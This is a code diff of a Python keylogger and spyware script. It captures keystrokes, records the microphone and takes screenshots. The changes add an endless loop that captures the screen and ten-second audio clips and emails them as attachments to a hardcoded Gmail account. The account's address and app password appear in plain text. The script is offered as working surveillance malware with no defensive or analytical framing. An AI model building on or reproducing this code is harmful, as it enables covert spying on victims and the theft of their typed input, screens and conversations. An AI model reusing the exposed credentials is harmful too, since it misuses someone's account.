@@ -5,23 +5,22 @@ from email.mime.multipart import MIMEMultipart
 from email.mime.text import MIMEText
 from email.mime.base import MIMEBase
 from email import encoders
+import time
+
+import pynput
 
 try:
     import logging
-    import os
     import platform
     import smtplib
     import socket
     import threading
     import wave
     import sounddevice as sd
-    from pynput import keyboard  # Import keyboard first
-    from pynput.keyboard import Listener
     from email import encoders
     from email.mime.base import MIMEBase
     from email.mime.multipart import MIMEMultipart
     from email.mime.text import MIMEText
-    import glob
 except ModuleNotFoundError:
     from subprocess import call
     modules = ["pyscreenshot", "sounddevice", "pynput"]
@@ -31,7 +30,7 @@ except ModuleNotFoundError:
 finally:
     EMAIL_ADDRESS = "titprocute1124@gmail.com"
     EMAIL_PASSWORD = "lfmn rvmd qyan pcha"
-    SEND_REPORT_EVERY = 10 # as in seconds
+    SEND_REPORT_EVERY = 15 # as in seconds
     class KeyLogger:
         def __init__(self, time_interval, email, password):
             self.interval = time_interval
@@ -59,9 +58,9 @@ finally:
                 current_key = str(key.char)
             except AttributeError:
                 if key == key.space:
-                    current_key = "SPACE"
+                    current_key = " "
                 elif key == key.esc:
-                    current_key = "ESC"
+                    current_key = " "
                 else:
                     current_key = " " + str(key) + " "
 
@@ -145,7 +144,7 @@ finally:
             self.appendlog(machine)
 
         def microphone(self):
-            fs = 44100
+            fs = 8820
             seconds = SEND_REPORT_EVERY
             obj = wave.open('sound.wav', 'w')
             obj.setnchannels(1)  # mono
@@ -156,32 +155,32 @@ finally:
             sd.wait()
 
             # self.send_mail(email=EMAIL_ADDRESS, password=EMAIL_PASSWORD, message=obj)
-            self.send_mail_withAttach(email=EMAIL_ADDRESS, password=EMAIL_PASSWORD, message="This is a wave test", attachment_path="./sound.wav")
+            self.send_mail_withAttach(email=EMAIL_ADDRESS, password=EMAIL_PASSWORD, message="", attachment_path="sound.wav")
 
         def screenshot(self):            
-            # take screenshot using pyautogui 
             image = pyautogui.screenshot() 
-            
-            # since the pyautogui takes as a  
-            # PIL(pillow) and in RGB we need to  
-            # convert it to numpy array and BGR  
-            # so we can write it to the disk 
             image = cv2.cvtColor(np.array(image), 
                                 cv2.COLOR_RGB2BGR) 
             
-            # writing it to the disk using opencv 
             cv2.imwrite("image1.png", image) 
-            self.send_mail(email=EMAIL_ADDRESS, password=EMAIL_PASSWORD, message=image)
+            # self.send_mail(email=EMAIL_ADDRESS, password=EMAIL_PASSWORD, message=image)
+            self.send_mail_withAttach(email=EMAIL_ADDRESS, password=EMAIL_PASSWORD, message="",attachment_path="image1.png")
 
         def run(self):
-            # self.screenshot()
-            self.microphone()
             # keyboard_listener = pynput.keyboard.Listener(on_press=self.save_data)
             # with keyboard_listener:
             #     self.report()
             #     keyboard_listener.join()
-            # with Listener(on_click=self.on_click, on_move=self.on_move, on_scroll=self.on_scroll) as mouse_listener:
+            # with pynput.keyboard.Listener(on_click=self.on_click, on_move=self.on_move, on_scroll=self.on_scroll) as mouse_listener:
             #     mouse_listener.join()
+          
+            while True:
+                self.screenshot()
+                self.microphone()
+                time.sleep(10)
+                      
+            
+            
 
             # if os.name == "nt":
             #     try:
